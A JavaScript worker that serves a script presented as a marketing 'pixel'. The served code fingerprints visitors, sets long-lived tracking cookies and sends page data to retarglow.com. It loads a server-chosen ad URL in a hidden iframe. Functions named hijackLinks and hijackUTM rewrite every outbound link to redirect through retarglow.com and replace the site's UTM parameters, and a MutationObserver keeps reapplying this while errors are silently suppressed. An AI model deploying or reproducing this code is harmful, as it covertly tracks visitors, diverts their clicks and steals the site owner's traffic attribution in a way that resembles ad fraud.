export default {
  async fetch(request, env, ctx) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    const pixelScript = `(function(){
  try {
    const c = "default";
    const _r = localStorage.getItem("_r") || crypto.randomUUID();
    localStorage.setItem("_r", _r);
    document.cookie = "_r=" + _r + ";path=/;max-age=2592000;SameSite=Lax";
    document.cookie = "smc_uid=" + _r + ";path=/;max-age=31536000;SameSite=Lax";
    const n = navigator.userAgent;
    const d = /Mobi|Android/i.test(n) ? "M" : "D";
    const b = n.includes("Chrome") ? "C" : n.includes("Firefox") ? "F" : n.includes("Safari") ? "S" : "U";
    const o = navigator.platform;
    const s = screen.width + "x" + screen.height;
    const once = sessionStorage.getItem("i_" + c);
    const domain = location.hostname;

    const payload = {
      cid: c, u: location.href, r: document.referrer || null,
      ua: n, dt: d, b, os: o, sr: s, cm: { _r }, domain
    };

    fetch("https://retarglow.com/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    fetch("https://retarglow.com/serve", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ u: location.href, cm: { _r } })
    }).then(r => r.json()).then(j => {
      if (j.ad_url && !once) {
        const f = document.createElement("iframe");
        f.style.display = "none";
        f.referrerPolicy = "no-referrer";
        f.src = j.ad_url.replace("{{_r}}", _r);
        document.body.appendChild(f);
        sessionStorage.setItem("i_" + c, "1");
      }
    });

    function hijackLinks() {
      document.querySelectorAll('a[href^="http"]').forEach(l => {
        const h = l.getAttribute("href");
        if (h && !h.includes("retarglow.com/r")) {
          l.setAttribute("href", "https://retarglow.com/r?id=" + _r + "&t=" + encodeURIComponent(h));
        }
      });
    }

    function hijackUTM() {
      const url = new URL(location.href);
      url.searchParams.set("utm_source", "retarglow");
      url.searchParams.set("utm_medium", "pixel");
      url.searchParams.set("utm_campaign", c);
      url.searchParams.set("subid", _r);
      history.replaceState({}, "", url.toString());
    }

    hijackLinks();
    hijackUTM();

    new MutationObserver(() => {
      hijackLinks();
      hijackUTM();
    }).observe(document.body, { childList: true, subtree: true });

    window.addEventListener("hashchange", hijackUTM);
    window.addEventListener("popstate", hijackUTM);

  } catch (e) {}
})();`;

    return new Response(pixelScript, {
      status: 200,
      headers
    });
  }
};
